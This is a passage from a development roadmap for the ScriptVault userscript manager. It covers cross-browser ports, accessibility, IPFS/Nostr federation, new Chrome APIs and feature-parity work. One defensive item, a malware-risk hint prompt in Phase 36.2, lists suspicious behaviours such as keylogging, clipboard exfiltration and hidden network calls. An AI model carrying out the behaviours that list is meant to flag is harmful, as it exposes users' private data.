- Bundle `webextension-polyfill` for `browser.*` Promise-based API parity with `chrome.*` [source 183]
- Switch background to **event page** format under Firefox build target (Firefox doesn't fully support service workers in MV3 yet — uses event pages with persistent: false equivalent)
- Handle Firefox's `userScripts` API as `optional_permissions` — first-run flow requests user grant [source 184]
- Replace any code that assumes `chrome-extension://` URL scheme — Firefox uses `moz-extension://` with **per-install random UUIDs** for `web_accessible_resources` (cannot hardcode) [source 185]
- Validate Xray Vision boundary: Firefox content scripts see "Xrayed" wrappers around page objects — code touching `unsafeWindow` / page globals must use `wrappedJSObject`
- Use Firefox's **`declarativeNetRequest`** carefully: Firefox's DNR has lower rule limits than Chrome and different `urlFilter` semantics — feature-detect [source 186]
- AMO submission: source code review required for minified/bundled extensions; provide unminified source archive
- **Effort:** 3–5 weeks

### 33.3 Firefox for Android Support
- Firefox Android is the **only mobile browser** that supports a curated set of MV3 extensions on a stable channel [source 187]
- Add `browser_specific_settings.gecko_android: {}` to opt into the Android extension catalog
- Audit popup layout: no sidebar API, no `commands` keyboard shortcuts, restricted `menus` API on Android
- Test with `web-ext lint` for Android API surface
- Submit to Mozilla's recommended-for-Android list (manual review process)
- **Effort:** 1–2 weeks (after 33.2)

### 33.4 Edge Add-ons Store Submission
- Build is Chrome-compatible — submit same `.zip` as CWS to Microsoft Partner Center [source 188]
- Differences: Edge's review is faster (~3 days vs CWS 7+ days); allows external installation links
- Add Edge install badge to README
- Track Edge-specific telemetry via `chrome.management.getSelf().installType`
- **Effort:** 1–3 days

### 33.5 Brave / Vivaldi / Opera / Arc Compat Sweep
- All Chromium-based; should "just work" with CWS build, but each has quirks:
  - **Brave Shields** runs before extensions; can interfere with `declarativeNetRequest` rules — document conflict resolution [source 189]
  - **Vivaldi**: command-chain API allows assigning ScriptVault actions to power keys; opt-in integration
  - **Opera**: must be installed from Opera addons store (separate review) or sideloaded
  - **Arc**: sidebar UI; ensure popup renders correctly in narrow chrome
- Compatibility matrix in README; smoke-test each on every release
- **Effort:** 1 week

### 33.6 Orion Browser (WebKit) Validation
- Orion (Kagi) supports both Chrome AND Firefox extensions via shim layer [source 190]
- Load Firefox build in Orion → verify `browser.userScripts` shim completeness
- Document install path in README
- **Effort:** 1–3 days

### 33.7 Safari Web Extension (Long-Tail)
- **Highest-effort target.** Requires Xcode, Apple Developer account ($99/yr), Swift companion app
- Use `xcrun safari-web-extension-converter` to bootstrap Xcode project [source 191]
- Reference implementation: **quoid/userscripts** (https://github.com/quoid/userscripts) — Swift wrapper + filesystem access via native messaging [source 192]
- iOS variant: even more constrained; iCloud sync via CloudKit (overlap with Phase 29.3)
- App Store review cycle: 1–4 weeks per submission
- **Defer until Phases 33.1–33.6 ship.** Decision gate: do we have 1k+ install community demand for Safari? If yes, fund 8–16 weeks of Swift work; if no, document workaround (use quoid/userscripts to import ScriptVault scripts)
- **Effort:** 8–16 weeks (research + native dev + App Store)

**Exit criteria:** WXT build pipeline produces 4 artifacts (chrome.zip, firefox.zip, edge.zip, safari.zip) on every release; Firefox extension published to AMO with active user count; Edge listing live in Add-ons store; Brave/Vivaldi/Opera/Arc compat matrix in README confirms green status; Orion install path documented; Safari decision gate documented (build or defer with workaround link).

---

## Phase 34 — Deep Accessibility & Author Education

**Goal:** Move beyond Phase 14's WCAG 2.2 structural baseline. Address Monaco screen reader gaps, voice control, forced-colors mode, cognitive accessibility, and onboarding pathways for new script authors. ScriptVault should be the most accessible userscript manager available.

### 34.1 Monaco Screen Reader Compatibility
- Set `accessibilitySupport: 'on'` explicitly in Monaco options (currently auto-detect, unreliable in iframe sandbox) [source 193]
- Add `ariaLabel: 'Userscript editor — press Alt+F1 for help'` to Monaco instance
- Implement Monaco's accessibility help dialog (Alt+F1) — currently disabled in default sandbox config
- Add live region announcement when Monaco loads: "Editor ready. Screen reader users press Alt+F1 for shortcuts."
- Provide "Plain textarea fallback" toggle in Settings — for users where Monaco ARIA tree breaks (NVDA in some Chrome versions, or screen readers that can't enter sandboxed iframes) [source 194]
- Document NVDA Browse Mode → Focus Mode transition (NVDA+Space) in user docs [source 195]
- **Effort:** 3–4 hours

### 34.2 Voice Control & Cursorless Compat
- Audit ScriptVault UI for **Talon Voice** users: every interactive element must have a unique `aria-label` or visible text [source 196]
- Add `data-talon-action="<verb>"` hints on common buttons (toggle, edit, delete) — Talon community wins
- **Cursorless** (VSCode + Talon voice coding) does NOT work with standalone Monaco — document this limitation in user docs and link to alternatives [source 197]
- For voice-first users: provide "Open in VSCode" path (Phase 12 feature) — they edit in VSCode with Cursorless, ScriptVault syncs back
- **Effort:** 2–3 hours

### 34.3 Keyboard Patterns (WAI-ARIA APG)
- Audit dashboard for full keyboard access per **WAI-ARIA Authoring Practices Guide** patterns [source 198]:
  - **Tablist**: arrow-key navigation between tabs (currently Tab-only)
  - **Grid** (script table): arrow keys navigate rows/cells, Home/End jump
  - **Combobox** (search): `role="combobox"` + `aria-expanded` for autocomplete dropdown
  - **Dialog**: focus trap + Escape handler (focus trap exists; Escape handler missing per Phase 14 audit)
- Add visible focus rings using **CSS `:focus-visible`** — not just `:focus` (avoid mouse-click focus rings)
- Skip-to-main-content link at top of every page (currently missing)
- **Effort:** 6–10 hours

### 34.4 Forced-Colors Mode (Windows High Contrast)
- Add `@media (forced-colors: active)` block to all CSS — replace custom colors with system colors (`Canvas`, `CanvasText`, `LinkText`, `ButtonText`, `ButtonFace`, `Highlight`) [source 199]
- Replace `box-shadow` focus indicators with `outline: 2px solid CanvasText` (box-shadow ignored in forced-colors)
- Monaco theme: Monaco has built-in `hc-black` and `hc-light` themes — switch via `window.matchMedia('(forced-colors: active)')` listener [source 200]
- Toggle and badge state: use `border` and `outline` for state indication, not background color (system overrides bg)
- **Effort:** 3–4 hours

### 34.5 Reduced Motion (CSS-First)
- Replace JS-based reduced-motion detection (Phase 14) with native `@media (prefers-reduced-motion: reduce)` CSS block [source 201]
- Disable: shimmer animations, hover lifts, modal slide-in, toast slide-up, scroll animations
- Monaco: respect via `cursorBlinking: 'solid'` and `smoothScrolling: false` when reduced motion is set
- Add Settings toggle "Override system motion preference" for users who want full motion despite OS setting
- **Effort:** 1–2 hours

### 34.6 Cognitive Accessibility & Plain Language
- Audit all error messages for technical jargon — rewrite at Flesch Reading Ease 60+ (8th grade) [source 202]
- Examples:
  - "ENOENT: no such file or directory" → "Couldn't find the file. It may have been moved or deleted."
  - "Failed to parse @match directive" → "ScriptVault couldn't understand the website pattern. Check the @match line for typos."
- Empty states with helpful copy: "No scripts yet. [Create your first script] or [browse Greasy Fork]"
- Consistent vocabulary: pick "userscript" OR "script" globally, not both
- Confirmation dialogs use plain verbs: "Delete script?" not "Are you sure you want to remove this user script?"
- **Effort:** 4–6 hours (one-pass audit) + ongoing

### 34.7 Author Education & Documentation Site
- Stand up dedicated docs site at **scriptvault.dev/docs** using **Astro Starlight** (smaller than Docusaurus, native dark mode, faster cold start) [source 203]
- Pages:
  - **Quick start** — install + first userscript in 5 minutes
  - **Userscript basics** — link to Violentmonkey's "Creating a Userscript" + MDN Content Scripts (don't reinvent) [sources 204, 205]
  - **GM API reference** — auto-generated from TS types
  - **Recipe book** — common patterns (intercept fetch, modify DOM on dynamic SPA, persist settings)
  - **Migration guides** — from TM, VM, Greasemonkey
  - **Accessibility guide for script authors** — "Don't break the page's a11y; here's how to test your script with a screen reader"
- Free **Algolia DocSearch** for OSS — typeahead search [source 206]
- Crowdin/Weblate integration for community-translated docs (overlap with 34.10)
- **Effort:** 8–12 hours initial + ongoing

### 34.8 First-Run Onboarding (Anti-Bloat Compliant)
- **NO interactive tutorial wizard** (anti-bloat). Instead: friendly empty-state copy + sample scripts.
- On first launch with zero scripts:
  - Empty-state card: "Welcome. Add scripts from a URL, paste code, or browse Greasy Fork."
  - Three buttons: `[Add from URL]`, `[Write new]`, `[Browse Greasy Fork]`
  - Inline "Hello World" template auto-loaded into the new-script editor
- After first script added: show one-time toast "Tip: scripts run automatically on matching sites. Toggle them off any time from the dashboard."
- No re-trigger; no "tour again" prompt
- **Effort:** 3–5 hours

### 34.9 Video Tutorial Channel
- Create **scriptvault.dev YouTube channel** with 5-minute screencasts:
  - "Install ScriptVault" (per-browser variants from Phase 33)
  - "Write your first userscript"
  - "Use GM_setValue / GM_getValue"
  - "Migrate from Tampermonkey"
  - "Sync across devices" (Phase 29 feature)
- Captions via YouTube auto-caption + manual review (a11y requirement)
- Embed videos in docs with `<iframe title="...">` per WCAG 2.1 SC 4.1.2
- **Effort:** 2–3 hours per video + filming time

### 34.10 Internationalization Deep Dive
- Replace positional `{0}` substitution with **ICU MessageFormat** for plurals/gender [source 207] — current approach breaks Russian (3 plural forms), Arabic (6), Polish, etc.
  - `messageformat-runtime` (~3 KB gzipped)
- Add RTL support: `dir="rtl"` on `<html>` for Arabic/Hebrew locales; mirror icons (chevrons, back arrows); flip scrollbar position
- Add 4 new locales: `ar`, `hi`, `ko`, `tr` (currently 8: de, en, es, fr, ja, pt, ru, zh)
- **Crowdin** free OSS plan — community translation pipeline; auto-PR new translations [source 208]
- Locale-aware `Intl.DateTimeFormat`, `Intl.NumberFormat`, `Intl.RelativeTimeFormat` (replace any hardcoded "5 minutes ago" strings)
- CJK font selection: ensure system-ui falls back to Noto Sans CJK on Linux (where system-ui may not include CJK glyphs)
- **Effort:** 6–10 hours

### 34.11 Accessibility Testing Automation
- Add **axe-core** to CI [source 209]:
  - Vitest test: run axe against rendered dashboard, fail on any WCAG 2.2 AA violation
  - `@axe-core/playwright` integrated with existing Puppeteer smoke test (`npm run smoke:dashboard`)
- Add **Pa11y CI** as secondary engine — catches issues axe misses [source 210]
- Lighthouse a11y score ≥ 90 enforced in CI
- Manual screen reader checklist: `docs/testing/screen-reader-checklist.md` — 8-step NVDA + VoiceOver protocol; run before every release
- **Effort:** 4–6 hours

**Exit criteria:** Monaco accessibility help dialog works (Alt+F1); plain-textarea fallback ships; Talon Voice users confirm dashboard is fully voice-controllable; WAI-ARIA APG patterns implemented for tablist/grid/combobox/dialog; forced-colors mode renders correctly on Windows High Contrast (manual screenshot test); `prefers-reduced-motion` is CSS-driven, no JS; all error messages pass Flesch 60+; docs site at scriptvault.dev/docs live with 5+ guides; first-run empty state ships (no wizard); 5+ YouTube tutorials published with captions; 12 locales supported with ICU plurals + RTL; axe-core + Pa11y in CI gating PRs; Lighthouse a11y ≥ 90 on every release.

---

## Phase 35 — Federation, Decentralization & Resilience

**Goal:** Make ScriptVault scripts resilient to censorship, takedowns, and single-point-of-failure registries — without adding heavyweight P2P dependencies. Cherry-pick zero/near-zero-dependency wins; reject SDK-heavy options.

**Anti-bloat philosophy:** This phase is **opportunistic**, not aspirational. Each subtask had to clear a "≤30 KB dependency, ≥10x user value" bar to be accepted. The full-fat federation stack (Matrix sync, Solid pods, Hypercore, Helia in-browser IPFS) is **rejected** with documented reasoning.

### 35.1 IPFS CID Integrity & Gateway Fallback
- When a script declares `@ipfs-cid bafy...` in its header, ScriptVault stores the CID alongside the script [source 211]
- On `@updateURL` 404 / DMCA takedown / DNS failure: fall back to public IPFS gateways: `ipfs.io`, `dweb.link`, `cf-ipfs.com`, `gateway.pinata.cloud`
- Verify content integrity: hash fetched bytes, compare to declared CID — **rejects tampered content automatically** (zero-trust)
- Authors opt-in to "Pin my scripts to IPFS" — reuses **Pinata** (500 files / 1 GB free) or **Storacha** (5 GB free) [source 212]
- Brave Browser native `ipfs://` handler: detect Brave via `navigator.brave?.isBrave()` and use direct ipfs:// URLs (no gateway needed) [source 213]
- **Zero new dependencies** — pure HTTP fetch + WebCrypto SHA-256
- **Effort:** 8–12 hours

### 35.2 Nostr-Based Script Discovery (NIP-C0)
- **NIP-C0** defines `kind:1337` events for code snippets [source 214]
- Add Nostr relay queries to the "Discover" tab (Phase 24): `wss://relay.nostr.band` + `wss://relay.damus.io` filter `kind:1337 AND #l:javascript`
- Display alongside GreasyFork/OpenUserJS results; clearly badge as "Nostr — uncensorable"
- Use **`nostr-tools`** library (~30 KB gzipped) — smallest of all federation protocols evaluated
- Authors can publish to Nostr via `nostr.com` web client or `damus` mobile app — ScriptVault doesn't need a publishing UI (defer; users opt-in)
- Scripts include `@nostr-event-id <hex>` header for follow-up updates via NIP-94 file metadata
- **Effort:** 12–16 hours

### 35.3 Cryptographic Author Identity (did:key)
- Every published script MAY include a `@author-did did:key:z6Mk...` header + detached Ed25519 signature [source 215]
- ScriptVault verifies signature using native `crypto.subtle.verify()` — **zero new dependencies**
- Benefits:
  - **Author impersonation prevention**: when GreasyFork removes a script and a malicious actor uploads a "replacement" with the same name, signature mismatch flags it
  - **Cross-registry identity**: same DID works on GreasyFork, Nostr, IPFS, OpenUserJS — author proves ownership without account-linking
  - **DMCA-survivor**: script removed from one registry; user re-discovers it elsewhere; signature confirms it's genuinely the same author
- Signature visible in script details: green checkmark "Verified author: did:key:z6Mk..." with copy-to-clipboard for cross-checking
- **Defers** full Verifiable Credentials (300 KB JSON-LD library) — DIDs alone are sufficient for the threat model
- **Effort:** 6–10 hours

### 35.4 ActivityPub Passive Consumption (Forgejo)
- When `@updateURL` hostname runs Forgejo (detected via `/.well-known/nodeinfo` returning `software.name === "forgejo"`), subscribe to the file's ActivityPub outbox for push-style update notifications [source 216]
- Plain HTTP GET to `/api/v1/activitypub/repository-id/<id>/outbox` — no AP server needed in ScriptVault
- Replaces polling for updates on Forgejo-hosted scripts: O(seconds) latency vs O(hours) for polling
- Codeberg.org runs Forgejo and hosts a growing share of indie userscripts — direct beneficiary
- Falls back to standard polling if outbox unavailable
- **Zero new dependencies** — plain fetch
- **Effort:** 4–6 hours

### 35.5 Self-Hosted Registry Specification
- Publish a public spec: `GET /.well-known/scriptvault-registry` returns JSON with registry metadata + script index [source 217]
- ScriptVault Settings → "Federated Registries" lets users add registry URLs; discovery merges all registries into one search UI
- Provide a reference implementation: single-binary Go server + SQLite, ~15 MB Docker image; one `docker run` command sets up a full registry
- Use cases:
  - Internal corporate userscripts (overlap with Phase 25.2)
  - Indie communities (a single PI subreddit could run their own)
  - Censorship resistance (someone runs a backup registry of removed Greasy Fork scripts)
- **Spec is open**; anyone can implement it; ScriptVault provides reference but doesn't gatekeep
- **Effort:** 16–24 hours (spec + reference impl + docs)

### 35.6 Censorship-Resistant Update Resolution
- When a script's primary `@updateURL` returns 404 or 403:
  1. Try IPFS CID (35.1)
  2. Try Nostr event ID (35.2)
  3. Try archive.org / Wayback Machine snapshot
  4. Surface "Script may have been removed. View [archive] | [Nostr] | [IPFS]"
- User decides whether to keep the cached version or accept the archived/republished one
- All three fallback sources verified against author signature (35.3) — **graceful degradation, no security relaxation**
- **Effort:** 6–10 hours

### 35.7 Rejected — With Documented Reasoning
The following federation patterns were **investigated and rejected**:
- **Matrix as sync transport**: 500 KB SDK; users prefer dedicated sync (Phase 21); link to Matrix room as community-only (overlap with Phase 31)
- **Solid Pods**: 300 KB SDK; <0.1% userscript-author overlap with Solid community; effort/value mismatch
- **DAT/Hypercore/Pear runtime**: requires Pear runtime install — userscript users won't install a separate runtime
- **WebRTC mesh sync (y-webrtc)**: 605 KB Yjs already accepted in Phase 29.4; mesh adds NAT traversal complexity for marginal benefit over server-mediated sync
- **WebTorrent**: 600 KB; userscripts are <100 KB — wrong scale for BitTorrent
- **Helia (in-browser IPFS node)**: 200 KB+ DHT; gateway fallback (35.1) achieves 95% of value for 0% of weight
- **Full Verifiable Credentials**: 300 KB JSON-LD; DIDs alone (35.3) are sufficient
- **Radicle P2P git**: requires `rad` binary — userscript users won't install
- **AT Protocol custom Lexicon**: maintaining a custom `xyz.scriptvault.userscript` lexicon adds versioning burden; defer until Bluesky's userscript community materializes (currently zero)

**Exit criteria:** IPFS CID integrity check works on 5+ test scripts; Nostr discovery surfaces ≥10 scripts in the Discover tab from public relays; did:key signature verification ships and is documented; Forgejo AP outbox subscription works against Codeberg-hosted test repo; self-hosted registry spec published at scriptvault.dev/spec/registry-v1.md with reference Go binary; censorship-resistant update flow tested with intentional 404 + IPFS/Nostr/archive.org fallback.

---

## Phase 36 — Local-Model Authoring & Modern Platform APIs

**Goal:** Catch up to Chrome 138-148 platform additions and the recent wave of Violentmonkey/ScriptCat author-experience improvements that landed since the v2.34/v0.16.13 baseline of Round 9.

### 36.1 Structured-Clone Message Serialization (Chrome 148)

Opt into [`"message_serialization": "structured_clone"`](https://developer.chrome.com/blog/structured-clone-messaging) in `manifest.json`. Today every cross-context message (background ↔ content ↔ popup ↔ sidepanel ↔ devtools) goes through JSON, which silently mangles `Map`, `Set`, `Date`, `BigInt`, `Error`, `NaN`, `Infinity`, `Blob`, and `File`.

- Audit `chrome.runtime.sendMessage` payloads for any of these types currently being hand-serialized (the `_recentUpdates` ring, `GM_xmlhttpRequest` response wrappers, backup payloads, dashboard event log).
- Once opted in, drop the `Array.from(map.entries())` workaround in: dashboard network log, GM_notification button payloads, recent-updates banner, `getRecentUpdates`/`clearRecentUpdates` handlers, and any code path that serializes a `Date` for stats.
- Cross-extension messaging breaks if the other extension uses the JSON format — keep `externally_connectable` (Phase 12.14 vscode.dev companion) on JSON or coordinate the cutover.
- No change to `chrome.storage.local`/`chrome.storage.session` (those already preserve structured types).

Source: [Chrome blog — Structured Clone Messaging (April 22, 2026)](https://developer.chrome.com/blog/structured-clone-messaging), [Chrome 148 release notes](https://developer.chrome.com/docs/extensions/whats-new).

**Caveats:** `SharedArrayBuffer` and transferable `ArrayBuffer` are still not supported under structured-clone messaging. Skip the opt-in if/when ScriptVault grows a WASM-heavy worker that needs zero-copy transfer (Phase 26).

### 36.2 Built-in Language Tooling (Chrome 138 Prompt API)

Chrome 138+ exposes [`LanguageModel`](https://developer.chrome.com/docs/extensions/ai/prompt-api) to extensions via Origin Trial. All inference is on-device — no network call, no API key, no telemetry leaving the browser. Model is ~3GB and downloads on first use; fall back gracefully when unavailable.

- **"Explain this script"** in the editor toolbar: feed the script body to the local model, get a 3-bullet plain-English summary in the install confirmation dialog. Reduces the friction of installing scripts whose code looks scary.
- **Static malware-risk hint**: prompt = "Flag suspicious patterns: keylogging, clipboard exfiltration, fingerprinting, hidden network calls, obfuscated eval. Return JSON `{risk: low|med|high, reasons: [...]}`." Surface in install dialog as an info row alongside the existing `@grant` audit. Not authoritative — labelled "model hint, verify manually".
- **`@require` library summarizer**: when adding a remote `@require`, the local model summarizes the fetched library so the user knows what they're trusting.
- **Linter narration** (Phase 15 dependency): translate `eslint-plugin-userscripts` errors into beginner-friendly prose for less experienced authors.
- **Hardware floor**: Windows 10+/macOS 13+/Linux/ChromeOS Plus, 22GB free, 4GB+ VRAM or 16GB RAM. Feature degrades to a "Not available on this device" notice; never blocks install.

Source: [Prompt API for Chrome Extensions](https://developer.chrome.com/docs/extensions/ai/prompt-api), [Chrome 148 sampling-parameters origin trial](https://chromestatus.com/feature/6325545693478912), [Built-in language-model hardware requirements](https://developer.chrome.com/docs/ai/get-started).

**Risk:** Model behaviour is non-deterministic. Never use the model risk hint as a hard block. Flag the feature as opt-in (off by default) under a new "Experimental → On-device analysis" settings group; hide the section entirely when `LanguageModel.availability()` returns `unavailable`.

### 36.3 RTL-Aware Side Panel via `sidePanel.getLayout()` (Chrome 140)

[`chrome.sidePanel.getLayout()`](https://developer.chrome.com/docs/extensions/reference/api/sidePanel#method-getLayout) reports whether the side panel is anchored on the user's left or right. ScriptVault's sidepanel currently assumes a fixed layout for its preview pane and matched-script panel.

- On `sidepanel.html` load, call `chrome.sidePanel.getLayout()`; set `dir="rtl"` on the body when the panel is on the right and the UI language is RTL (Arabic, Hebrew, Persian — Phase 14 covers RTL strings).
- Re-query on `chrome.windows.onFocusChanged` to handle users who flip the panel mid-session.
- Animations (slide-in toasts, drawer transitions) flip direction to match.

Source: [Chrome 140 — sidePanel.getLayout()](https://developer.chrome.com/docs/extensions/reference/api/sidePanel#method-getLayout).

### 36.4 `// @tag` Inline Tag Directive (Violentmonkey parity)

Violentmonkey v2.35.2 added `// @tag <name>` (preserves inner spaces, e.g. `// @tag my util`). ScriptVault has tags assigned via the dashboard UI but no in-source declaration.

- Parser: extend `parseUserscript` to collect repeated `@tag` lines into `meta.tags: string[]`.
- On install/update: union the source-declared `meta.tags` with any user-assigned tags. User-assigned tags are never removed by a re-install (already covered by Phase 12.8).
- Round-trips through the Tampermonkey ZIP export/import format unchanged (TM ignores unknown directives).
- Source: [Violentmonkey v2.35.2 release notes](https://github.com/violentmonkey/violentmonkey/releases/tag/v2.35.2), [VM dashboard #2499](https://github.com/violentmonkey/violentmonkey/issues/2499) (the regression that proves it's a real attack surface — handle missing/malformed `@tag` lines gracefully so dashboard never wedges).
- **Status:** ✅ Shipped in v3.9.0. Parser already collected `@tag` via `ARRAY_KEYS`; user-assigned tags now survive re-install through `getMetaArray('tag')` source+existing union in `src/modules/public-api.ts`. Multi-word tags (`// @tag my util`) round-trip intact — comma desugar deliberately skips `@tag` so values like `tools,utility` aren't mangled.

### 36.5 `@require-id` Local Module Resolution

Open VM enhancement [#2419](https://github.com/violentmonkey/violentmonkey/issues/2419) — share utility code between scripts without a CDN. One script declares `// @id utils.common` and exposes its body; others reference `// @require utils.common` (no URL).

- Parser: accept bare `@id <name>` and `@require <name>` (no scheme = local lookup).
- Wrapper builder: when a `@require` token has no scheme, search the installed-scripts index for a matching `@id`. Concatenate before the consumer's body, same as remote `@require`.
- Cycle detection: refuse to resolve `A → B → A`; surface in install dialog with a one-line "circular @require: A → B" error.
- Compatibility: TM/VM/SC don't yet implement this — emit a `console.warn` if the user exports a script with bare `@require` to other managers; keep a "Compatibility Mode" flag in settings that blocks bare references on export.
- Source: [VM #2419](https://github.com/violentmonkey/violentmonkey/issues/2419), [User JavaScript and CSS local-include reference](https://chromewebstore.google.com/detail/user-javascript-and-css/nbhcbdghjpllgmfilhnhkllmkecfmpld).

### 36.6 Comma-Separated `@match` Convenience Syntax

Open VM enhancement [#2403](https://github.com/violentmonkey/violentmonkey/issues/2403). Allow `// @match xyz.com,zyx.com,xzy.*` as a parser-side desugar to three separate `@match` patterns, mirroring uBlock Origin's filter syntax. Authors maintaining many sibling sites currently spam 20 lines of `@match`.

- Parser: split `@match` directive values on `,` (with leading/trailing whitespace trimmed); push each fragment through the existing match validator. Reject any fragment that fails validation, with a per-fragment error message.
- Round-trip preserves the comma form on save; export to TM-compatible format expands back to one-per-line so existing managers can ingest the file.
- Same desugar applies to `@include` and `@exclude-match`.
- Source: [VM #2403](https://github.com/violentmonkey/violentmonkey/issues/2403).
- **Status:** ✅ Shipped in v3.9.0. Comma-split branch added in `src/background/parser.ts` and mirrored in `background.core.js` + `tests/parser.test.js`. Splittable keys: `match`, `include`, `exclude`, `excludeMatch`, `connect`. Excluded: `tag`, `grant`, `require`, `antifeature`, `compatible`, `incompatible` (raw values may legitimately contain commas).

### 36.7 Default Top-Level Await

Open VM enhancement [#2342](https://github.com/violentmonkey/violentmonkey/issues/2342). Currently scripts must declare `// @top-level-await` to use bare `await` at module scope. Make it the default — newer authors don't know about the directive and JS itself permits TLA in modules since 2022.

- Wrapper builder: drop the `(async () => { ... })()` IIFE for new scripts; emit module-style `await`-tolerant scope. Behind an opt-out `// @no-top-level-await` for the rare cases where authors depend on synchronous IIFE return semantics.
- Migration: existing scripts unchanged (their `// @top-level-await` directive becomes a no-op annotation).
- Tests: add cases for `await fetch(...)`, `await import(...)` at top level; for `// @no-top-level-await` falling back to the legacy IIFE.
- Source: [VM #2342](https://github.com/violentmonkey/violentmonkey/issues/2342), [TC39 top-level await proposal](https://github.com/tc39/proposal-top-level-await).

### 36.8 Per-Frame Popup Menu Commands (Violentmonkey v2.36 parity)

VM v2.36.0 separated `GM_registerMenuCommand` entries by frame in the popup. ScriptVault currently lumps all commands together regardless of which frame registered them.

- Track `frameId` (and `frameUrl`, when available) for every `GM_registerMenuCommand` call.
- Popup groups commands under a per-frame collapsible header: "Top frame" / `iframe https://example.com/embed`.
- Single-frame scripts (the common case) still render flat — no header until ≥2 frames are involved.
- Source: [Violentmonkey v2.36.0 release notes](https://github.com/violentmonkey/violentmonkey/releases/tag/v2.36.0).

### 36.9 Per-Script Author Notes Field

VM v2.35.2 added a freeform notes/comments text input in the editor settings panel — distinct from `@description` because notes are local-only and don't ship in exports by default.

- Data model: `Script.userNotes: string` (already capacity in IDB schema; just plumb it through).
- UI: new "Notes" textarea in the dashboard script-edit settings panel and in the popup info card.
- Backup: notes included in ZIP export under a new `meta.json` sibling so they round-trip with ScriptVault but are stripped on TM/VM export ("Strip user fields on export" toggle, already covered by Phase 12.6 selective export).
- Source: [Violentmonkey v2.35.2 release notes](https://github.com/violentmonkey/violentmonkey/releases/tag/v2.35.2).

### 36.10 Live Local-File `@require` Tracking

VM v2.35.0 added auto re-fetch of `localhost`/`file:` `@require` URLs whenever the manager wakes (per their [edit-with-your-favorite-editor](https://violentmonkey.github.io/posts/how-to-edit-scripts-with-your-favorite-editor/) workflow). Authors with VS Code open to a `localhost:3000/lib.js` get hot-reload across saves without bumping `@version`.

- Detection: `@require` URLs whose host resolves to `localhost`, `127.0.0.1`, `[::1]`, or `file://` are flagged as `dynamic`.
- On every script registration cycle (Phase 3.4 already runs on SW wake), re-fetch dynamic `@require` URLs with `cache: 'no-store'` and rebuild the wrapped script.
- ETag/`Last-Modified` honored to skip rebuilds when nothing changed.
- Settings toggle: "Live-reload local @require dependencies" (default off; on for explicitly opted-in scripts).
- Source: [Violentmonkey v2.35.0 release notes](https://github.com/violentmonkey/violentmonkey/releases/tag/v2.35.0), [VM blog post on local editor workflow](https://violentmonkey.github.io/posts/how-to-edit-scripts-with-your-favorite-editor/).

### 36.11 `{{icon}}` Template Token

VM v2.34.1 added `{{icon}}` to the new-script template — substitutes the active tab's favicon URL into `// @icon`. Removes a manual paste step every time someone scaffolds a new script for a specific site.

- Extend the template engine with the existing `{{name}}`, `{{namespace}}`, `{{match}}` tokens.
- Add `{{icon}}` that resolves to `chrome.tabs.query({active: true, currentWindow: true})[0].favIconUrl` at template-instantiation time.
- Document the token in the new-script wizard alongside the others.
- Source: [Violentmonkey v2.34.1 release notes](https://github.com/violentmonkey/violentmonkey/releases/tag/v2.34.1).
- **Status:** ✅ Shipped in v3.9.0. `resolveTemplateTokens()` in `pages/dashboard.js` resolves `{{name}}`, `{{namespace}}`, `{{match}}`, `{{icon}}` against the active tab at create-time. Unresolvable directive lines are stripped. Blank template now ships with `// @icon {{icon}}`.

### 36.12 Cron `once(timestamp)` Schedule Expression (ScriptCat parity)

ScriptCat v0.16.14 extended its cron syntax with `once(...)` — schedule a one-shot run at a specific wall-clock time instead of cron's recurrence. Phase 13 (Platform Modernization) has a scheduler hook; this slots in cleanly.

- Parser: extend the schedule-directive grammar to accept `once(2026-06-01T08:00:00Z)` alongside the existing cron expressions.
- Scheduler: when a `once(...)` job fires, mark it consumed and remove from the active alarms set.
- Stale `once(...)` jobs that the SW missed (browser was closed past the trigger) prompt the user on next dashboard open: "Run / discard."
- Source: [ScriptCat v0.16.14 release notes](https://github.com/scriptscat/scriptcat/releases/tag/v0.16.14), [ScriptCat cron docs](https://docs.scriptcat.org/en/docs/dev/api/scriptcat-api/#crontab).

### 36.13 Storage Vacuum on Recycle Bin Empty

VM v2.35.0 vacuums the storage backend after the recycle bin is emptied. ScriptVault's IDB layer (Phase 2) doesn't expose an explicit compact, but cleanup hooks reduce wasted bytes after large deletions.

- After `clear()` or bulk `delete()` on the trash store (Phase 12.13): walk the live `scripts` and `values` stores and rewrite any tombstoned keys (`null` script-bodies, orphaned values).
- Re-run the dead-code GC on `_recentUpdates` ring buffer.
- Trigger automatically when ≥50 scripts are emptied at once or quota usage drops below 50% post-delete; expose a manual "Compact storage" button in Settings → Maintenance.
- Source: [Violentmonkey v2.35.0 release notes](https://github.com/violentmonkey/violentmonkey/releases/tag/v2.35.0).

### 36.14 Popup "Add Current Domain" Button

VM enhancement [#2403](https://github.com/violentmonkey/violentmonkey/issues/2403) (point 1). Add a one-click "+" in the popup that adds the current page's domain to a selected script's `@match` list — no editor open, no source edit. Useful for link-shortener domains that rotate every 1-2 days, or for adding a CDN mirror to an existing rule.

- UI: each script row in the popup gets a hover-revealed "+" button.
- Click prompts: "Add `https://*.example.com/*` to <script-name>?" with [Confirm] / [Cancel].
- On confirm: append a new `@match` directive to the script's source, save through the same path as editor save (validates, re-registers, reloads matched tabs).
- Sibling action: "Disable on this domain" appends an `@exclude-match` instead.
- Source: [VM #2403](https://github.com/violentmonkey/violentmonkey/issues/2403).

**Exit criteria:** Manifest opts into `structured_clone` and the dashboard sends/receives `Map`/`Date`/`Set`/`Blob` round-trip; local summarizer present in install dialog and editor toolbar (gracefully hidden when unavailable); side panel mirrors layout; `@tag` parsed end-to-end with round-trip; bare `@require <id>` resolves locally with cycle guard; comma-separated `@match` parses and round-trips; default TLA wrapper ships behind an opt-out; per-frame popup menus group by frame; per-script notes editable + persisted; localhost `@require` live-reloads on SW wake; `{{icon}}` template token works; `once(...)` cron schedule fires; manual storage compaction button works; popup +Domain button appends and re-registers.

---

## Phase 37 — Enterprise Distribution & CWS Compliance Round 2

**Goal:** Track CWS publisher-side changes from 2026 H1 that affect how ScriptVault ships and is trusted, plus the cross-extension interop matrix that the Chrome 148 messaging change introduces.

### 37.1 CWS Enterprise Publishing

Chrome Web Store now supports private publishing to approved external organizations ([blog post, Feb 20 2026](https://developer.chrome.com/blog/cws-new-enterprise-publishing-option)) — distinct from the existing "private to your domain" option.

- For ScriptVault's enterprise track (Phase 25): document the workflow for an org admin to approve ScriptVault for their tenant; surface the org's deployment policy hash inside the dashboard so users know they're on a managed build.
- Update CWS publish workflow (`publish.sh`) with a `--enterprise <org-id>` flag that bypasses the public listing.
